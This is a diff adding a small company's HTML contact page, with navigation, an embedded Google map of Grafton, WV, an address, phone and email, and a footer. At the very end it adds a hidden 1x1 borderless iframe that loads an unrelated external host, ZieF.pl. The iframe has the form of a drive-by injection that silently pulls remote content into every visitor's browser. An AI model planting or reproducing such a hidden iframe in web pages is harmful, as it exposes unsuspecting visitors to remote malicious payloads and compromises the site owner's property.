@@ -1,0 +1,54 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>CHEROKEE ENTERPRISE CORPORATION</title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+<div class="top-tail">
+  <div id="main">
+    <div id="nav">
+      <div id="navl"><img src="images/logo.jpg" width="420" height="60" alt="logo" /></div>
+      <div id="navr">
+        <ul>
+          <li><a href="index.php">Home</a></li>
+          <li><a href="about.php">About Us</a></li>
+          <li id="active"><a href="project.php">Projects</a></li>
+          <li><a href="contact.php">Contacts</a></li>
+        </ul>
+      </div>
+      <div class="clear"></div>
+    </div>
+    <div id="container">
+      <div id="contactl">
+      <h2><span style="color:#000">Find</span> <span style="color:#ff4405">Us</span></h2>
+       <div id="map"><iframe width="480" height="250" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=Grafton,+WV,+United+States&amp;aq=1&amp;oq=Grafton+w&amp;sll=37.0625,-95.677068&amp;sspn=25.068921,56.513672&amp;ie=UTF8&amp;hq=&amp;hnear=Grafton,+Taylor,+West+Virginia&amp;t=m&amp;ll=39.340936,-80.018921&amp;spn=0.03319,0.082226&amp;z=13&amp;iwloc=A&amp;output=embed"></iframe></div>
+      <h3> <span style="color:#000">Our</span> <span style="color:#ff4405">Contact</span></h3>
+      CHEROKEE ENTERPRISE CORPORATION<br />
+       Route 2, Box 438, Grafton, WV 26354. <br />
+       E-mail :mail@cherokeeenterprise.com<br />
+       Tel :304-265-1821</div><div id="contactr">
+      <h2><span style="color:#000">Coming</span> <span style="color:#ff4405">Soon</span></h2><img src="images/Coming_Soon_logo.gif"></div>
+      <div class="clear"></div>
+    </div>
+    <div class="space">&nbsp;</div>
+    <div id="footer"><div id="fm"><ul>
+          <li><a href="index.php">Home</a></li>
+          <li><a href="about.php">About Us</a></li>
+          <li id="active"><a href="project.php">Projects</a></li>
+          <li><a href="contact.php">Contacts</a></li>
+        </ul></div><div class="clear"></div>
+        <div id="fl">
+          CHEROKEE ENTERPRISE CORPORATION
+            <h2>304-265-1821</h2>
+        </div><div id="fr">&copy; CHEROKEE ENTERPRISE CORPORATION 2012</div><div class="clear"></div>
+    </div>
+        
+    <div id="fs">&nbsp;</div>
+  </div>
+</div>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
